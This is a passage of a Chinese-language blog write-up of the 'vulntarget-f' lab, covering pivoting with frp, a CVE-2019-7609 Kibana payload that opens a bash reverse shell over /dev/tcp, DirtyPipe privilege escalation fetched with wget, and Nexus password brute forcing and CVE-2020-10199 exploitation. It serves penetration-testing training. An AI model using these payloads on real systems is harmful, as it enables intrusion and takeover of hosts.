+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.150.141:7071/downloads/shell.jsp</span><br><span class="line"># 密码：rebeyond</span><br></pre></td></tr></table></figure>
+
+<p>然后和前面的操作就一样了</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>利用frp建立代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f11.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini &amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f12.png"></p>
+<p>上传fscan扫一下内网，发现存在主机192.168.20.129，开放了22、5601、9200、9300端口</p>
+<p><img src="/../imgs/vulntarget-f13.png"></p>
+<p><img src="/../imgs/vulntarget-f14.png"></p>
+<p>访问如下，可以得知是kibana</p>
+<p><img src="/../imgs/vulntarget-f15.png"></p>
+<p><img src="/../imgs/vulntarget-f16.png"></p>
+<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>搜索一下相关漏洞，发现有个CVE-2019-7609 Kibana远程代码执行漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POC</span><br><span class="line"> </span><br><span class="line">.es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;bash -c \&#x27;bash -i&gt;&amp; /dev/tcp/You_VPS/You_VPS_Port 0&gt;&amp;1\&#x27;&quot;);//&#x27;) .props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)</span><br><span class="line"> </span><br><span class="line">.es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/You_VPS/You_VPS_Port 0&gt;&amp;1&quot;);process.exit()//&#x27;) .props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞复现</strong></p>
+<p>在导航栏中点击Timelion，在文本框中输入如下反弹shell的poc并运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># exec括号后面的内容为代码执行</span><br><span class="line">.es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;bash -c \&#x27;bash -i&gt;&amp; /dev/tcp/192.168.20.128/8888 0&gt;&amp;1\&#x27;&quot;);process.exit()//&#x27;).props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f17.png"></p>
+<p>然后点击左侧导航栏的Canvas，成功接收到shell</p>
+<p><img src="/../imgs/vulntarget-f18.png"></p>
+<p>或者直接拿**<a target="_blank" rel="noopener" href="https://github.com/LandGrey/CVE-2019-7609">exp</a>**打（没打成功，这里靶场环境存在一些问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-2019-7609-kibana-rce.py -u 192.168.20.129:5601 -host 192.168.20.128 -port 8888 --shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f19.png"></p>
+<p>然后nc监听8888端口成功连上，进行信息收集一波发现192.168.30.128的网卡</p>
+<p><img src="/../imgs/vulntarget-f20.png"></p>
+<p>接着尝试Ubuntu内核提权等，最后利用**<a target="_blank" rel="noopener" href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">CVE-2022-0847</a>**在本地编译再上传运行从而成功提权</p>
+<p>首先本地编译好并开启web服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>再去centos中下载并开启web服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.150.128/exploit</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+
+<p>再来到ubuntu中下载编译好的exp时发现一直没反应，后面会提示是没有权限下载，所以再去tmp目录下进行下载即可成功下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd tmp</span><br><span class="line">wget http://192.168.20.128/exploit</span><br></pre></td></tr></table></figure>
+
+<p>执行exp提权，发现报错说我编译的版本太高了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/vulntarget-f21.png"></p>
+<p>后面换了个较低版本的Ubuntu18.4的进行编译成功提权，并找到flag：vulntarget{admin&#x2F;top1000.txt}</p>
+<p><img src="/../imgs/vulntarget-f22.png"></p>
+<p>还有个集成好的提权工具**<a target="_blank" rel="noopener" href="https://github.com/liamg/traitor">traitor</a>**可以利用（但是这里我没利用成功</p>
+<p><img src="/../imgs/vulntarget-f23.png"></p>
+<p>再上传fscan扫一下内网，发现还有个192.168.30.129的网卡开放了22、8081端口</p>
+<p><img src="/../imgs/vulntarget-f24.png"></p>
+<p>接着上传frp建立代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 frpc    # 如果用+x这里不知道为啥还是会显示没权限</span><br><span class="line">nohup ./frpc -c ./frpc.ini &amp;</span><br></pre></td></tr></table></figure>
+
+<p>访问8081端口如下，可以得知是Nexus 3.21.0-05</p>
+<p><img src="/../imgs/vulntarget-f25.png"></p>
+<p>搜索其漏洞可以发现可能存在CVE-2020-10199远程代码执行漏洞，但是需要先知道账号密码，弱口令尝试了一下都不行，回头看前面我们得到的flag的内容，可以猜测到这里的账号就是admin，而密码则是top1000中的一个，于是通过burp爆破密码，抓包可以看出这里账号密码是加密的，并且不难看出是base64</p>
+<p><img src="/../imgs/vulntarget-f26.png"></p>
+<p>于是这里payload设置为base64，并添加top1000字典</p>
+<p><img src="/../imgs/vulntarget-f27.png"></p>
+<p>爆破出来后base64解出密码：abcdef</p>
+<p><img src="/../imgs/vulntarget-f28.png"></p>
+<p>登录后抓包获取登录后的cookie及csrf属性</p>
+<p><img src="/../imgs/vulntarget-f29.png"></p>
+<p>但是后面这里执行命令却不行了</p>
+<p><img src="/../imgs/vulntarget-f30.png"></p>
+<p>但是它影响版本：Nexus Repository Manager OSS&#x2F;Pro 3.x &lt;&#x3D; 3.21.1，再尝试直接利用**<a target="_blank" rel="noopener" href="https://github.com/zhzyker/CVE-2020-10199_POC-EXP">exp</a>**打一下成功了，并找到flag：vulntarget-f{(^<em>^ this__is__flag ^</em>^}</p>
+<p><img src="/../imgs/vulntarget-f31.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/12/13/vulntarget-f/">http://example.com/2022/12/13/vulntarget-f/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">MssnHarvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulntarget/">vulntarget</a></div><div class="post-share"><div class="social-share" data-image="/../imgs/vulntarget-f.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2022/12/20/vulntarget-g/" title="vulntarget-g"><img class="cover" src="/../imgs/vulntarget-g.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">vulntarget-g</div></div></div></a><a class="pagination-related  no-desc" href="/2022/12/12/vulntarget-i/" title="vulntarget-i"><img class="cover" src="/../imgs/vulntarget-i.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">vulntarget-i</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2022/12/20/vulntarget-g/" title="vulntarget-g"><img class="cover" src="/../imgs/vulntarget-g.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-20</div><div class="info-item-2">vulntarget-g</div></div></div></a><a class="pagination-related no-desc" href="/2023/01/13/vulntarget-k/" title="vulntarget-k"><img class="cover" src="/../imgs/vulntarget-k.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-13</div><div class="info-item-2">vulntarget-k</div></div></div></a><a class="pagination-related no-desc" href="/2024/11/16/vulntarget-n/" title="vulntarget-n"><img class="cover" src="/../imgs/vulntarget-n.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-16</div><div class="info-item-2">vulntarget-n</div></div></div></a><a class="pagination-related no-desc" href="/2022/12/12/vulntarget-i/" title="vulntarget-i"><img class="cover" src="/../imgs/vulntarget-i.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-12</div><div class="info-item-2">vulntarget-i</div></div></div></a><a class="pagination-related no-desc" href="/2022/12/06/vulntarget-d/" title="vulntarget-d"><img class="cover" src="/../imgs/vulntarget-d.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-06</div><div class="info-item-2">vulntarget-d</div></div></div></a><a class="pagination-related no-desc" href="/2022/12/09/vulntarget-e/" title="vulntarget-e"><img class="cover" src="/../imgs/vulntarget-e.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-09</div><div class="info-item-2">vulntarget-e</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Harvey</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/MssnHarvey/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bro, you're under arrest.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.</span> <span class="toc-text">横向渗透</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/01/%E7%BA%A2%E9%98%9F%E5%A4%87%E5%BF%98%E5%BD%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/" title="红队备忘录-信息收集篇"><img src="/../imgs/xxsj.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红队备忘录-信息收集篇"/></a><div class="content"><a class="title" href="/2026/02/01/%E7%BA%A2%E9%98%9F%E5%A4%87%E5%BF%98%E5%BD%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/" title="红队备忘录-信息收集篇">红队备忘录-信息收集篇</a><time datetime="2026-02-01T12:19:43.000Z" title="发表于 2026-02-01 20:19:43">2026-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/19/FineReport%20RCE202512/" title="帆软报表前台远程代码执行漏洞"><img src="/../imgs/FineReport2512.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="帆软报表前台远程代码执行漏洞"/></a><div class="content"><a class="title" href="/2026/01/19/FineReport%20RCE202512/" title="帆软报表前台远程代码执行漏洞">帆软报表前台远程代码执行漏洞</a><time datetime="2026-01-19T08:28:33.000Z" title="发表于 2026-01-19 16:28:33">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/16/vulntarget-n/" title="vulntarget-n"><img src="/../imgs/vulntarget-n.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulntarget-n"/></a><div class="content"><a class="title" href="/2024/11/16/vulntarget-n/" title="vulntarget-n">vulntarget-n</a><time datetime="2024-11-16T12:16:47.000Z" title="发表于 2024-11-16 20:16:47">2024-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/27/vulntarget-m/" title="vulntarget-m"><img src="/../imgs/vulntarget-m.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulntarget-m"/></a><div class="content"><a class="title" href="/2024/10/27/vulntarget-m/" title="vulntarget-m">vulntarget-m</a><time datetime="2024-10-27T14:03:25.000Z" title="发表于 2024-10-27 22:03:25">2024-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/" title="tomcat实现国密ssl"><img src="/../imgs/tomcatssl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="tomcat实现国密ssl"/></a><div class="content"><a class="title" href="/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/" title="tomcat实现国密ssl">tomcat实现国密ssl</a><time datetime="2024-03-14T07:28:33.000Z" title="发表于 2024-03-14 15:28:33">2024-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Harvey</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
